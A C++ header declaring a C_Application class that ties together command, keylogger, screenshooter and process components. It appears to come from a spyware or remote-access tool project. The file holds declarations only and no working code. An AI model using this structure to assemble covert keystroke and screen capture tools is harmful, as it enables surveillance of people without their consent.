// Filename: class.application.h
// Author:   Patryk Połeć

#pragma once

class C_Application
{
	// Constructor and destructor
	public:
		C_Application(C_Base *_objBase, C_Command *_objCommand, C_Keylogger *_objKeylogger, C_Screenshooter *_objScreenshooter);
		~C_Application();

	// Public methods
	public:
		void Start();

	// Private methods
	private:
	    
	// Public fields
	public:

	// Private fields
	private:
		C_Base
			*objBase;

		C_Command
			*objCommand;

		C_Keylogger 
			*objKeylogger;

		C_Screenshooter 
			*objScreenshooter;

		C_Process
			*objProcess;

		DWORD
			processID;
};